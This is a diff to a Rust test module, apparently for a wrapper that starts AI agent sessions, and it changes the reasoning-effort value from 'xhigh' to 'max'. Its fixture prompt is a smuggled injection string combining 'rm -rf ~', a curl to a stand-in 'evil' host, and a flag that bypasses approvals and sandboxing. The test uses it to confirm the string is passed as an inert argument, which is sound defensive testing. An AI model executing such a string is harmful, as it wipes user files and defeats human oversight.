@@ -159,7 +159,7 @@ mod tests {
             prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                 .to_string(),
             model: Some("gpt-8-billion".to_string()),
-            effort: SessionEffort::XHigh,
+            effort: SessionEffort::Max,
         };
 
         let prepared =
@@ -173,7 +173,7 @@ mod tests {
                 "--model",
                 "gpt-8-billion",
                 "-c",
-                "model_reasoning_effort=\"xhigh\"",
+                "model_reasoning_effort=\"max\"",
                 OWNED_THREAD_ID,
                 "--",
                 "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox",
@@ -185,7 +185,7 @@ mod tests {
         assert_eq!(requests[2]["params"]["model"], "gpt-8-billion");
         assert_eq!(
             requests[2]["params"]["config"]["model_reasoning_effort"],
-            "xhigh"
+            "max"
         );
         assert_eq!(
             requests[3]["params"]["name"],
